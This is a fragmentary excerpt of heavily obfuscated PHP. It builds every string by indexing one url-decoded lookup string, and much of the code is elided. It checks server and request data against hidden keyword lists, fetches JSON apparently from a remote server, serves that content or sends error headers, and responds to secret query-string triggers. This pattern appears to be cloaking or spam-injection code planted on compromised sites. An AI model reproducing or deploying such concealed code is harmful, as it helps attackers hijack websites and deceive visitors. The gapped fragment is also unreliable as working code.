...
$O = urldecode($OOOOOO);
date_default_timezone_set($O[35] . $O[29] . $O[47]);
$OO = @$_SERVER[
    $O[38] .
        $O[34] .
        $O[47] .
...
$OOOOOOO =
    (isset($_SERVER[$O[41] . $O[30] . $O[30] . $O[35] . $O[37]]) &&
        $_SERVER[$O[41] . $O[30] . $O[30] . $O[35] . $O[37]] ==
            $O[8] . $O[24]) ||
    (isset(
        $_SERVER[
            $O[41] .
        ...
        $_SERVER[
            ...
            $O[15] . $O[4] . $O[4] . $O[9] . $O[11])
        ? $O[15] . $O[4] . $O[4] . $O[9] . $O[11] . $O[62] . $O[63] . $O[63]
        : $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63];
...
if (strstr($Oo, $O[59] . $O[20] . $O[25] . $O[18])) {
    $Ooooo = dirname($Oo);
...
function OooooOOOOoo($O, $OoooOO0, $OOOOOOOo, $Oo, $OoO, $OOOOOOO, $Ooooo)
{
    ...
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {
        header(
            $O[41] .
                $O[30] .
                $O[30] .
    ...
    if (empty($Ooooooo) || $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 444) {
        header(
            $O[41] .
                $O[30] .
                $O[30] .
...
function OooooO(
    ...
    $Oooooo =
        ...
        $o0o0oOO000 = basename(__FILE__);
    if (
        $_GET[$O[22] . $O[13] . $O[52] . $O[25] . $O[10] . $O[9]] ==
        $O[8] .
            $O[24] .
            $O[18] .
            $O[7] .
    ...
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (
        isset($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]]) &&
        $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == $O[68] . $O[67] . $O[67]
    ) {
        $Oooooooo = $Ooooooo[$O[12] . $O[10] . $O[4] . $O[10]];
    ...
    if (
        isset($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]]) &&
        $Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == $O[70] . $O[67] . $O[68]
    ) {
        echo $O[37] .
            $O[6] .
            $O[23] .
...
if (isset($_GET[$O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11]])) {
    ...
    $Oooooo =
        ...
        $o0o0oOO000;
    if (
        $_GET[$O[22] . $O[13] . $O[52] . $O[23] . $O[8] . $O[4]] ==
        $O[8] .
            $O[24] .
            $O[18] .
            $O[7] .
    ...
    if (
        ...
        exit($O[13] . $O[10] . $O[7] . $O[18] . $O[88] . $O[88] . $O[88]);
    }
}
if (
    preg_match(
    ...
    if (
        $_GET[$O[22] . $O[13] . $O[52] . $O[16] . $O[6] . $O[25] . $O[9]] ==
        $O[8] .
            $O[24] .
            $O[18] .
            $O[7] .
...
if (
    ...
    stristr($OOOOO, $O[23] . $O[7] . $O[24] . $O[14]) ||
    stristr($OOOOO, $O[31] . $O[88] . $O[42]) ||
    stristr($OOOOO, $O[5] . $O[88] . $O[16]) ||
    stristr($OOOOO, $O[5] . $O[10] . $O[15] . $O[8] . $O[8]) ||
    stristr($OOOOO, $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2]) ||
    stristr(
        $OOOOO,
        $O[40] .
            $O[8] .
    ...
    if (!empty($OooOO)) {
        ...
        if ($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 404) {
            header(
                $O[41] .
                    $O[30] .
                    $O[30] .
        ...
        if ($Ooooooo[$O[21] . $O[8] . $O[12] . $O[2]] == 500) {
            header(
                $O[41] .
                    $O[30] .
                    $O[30] .
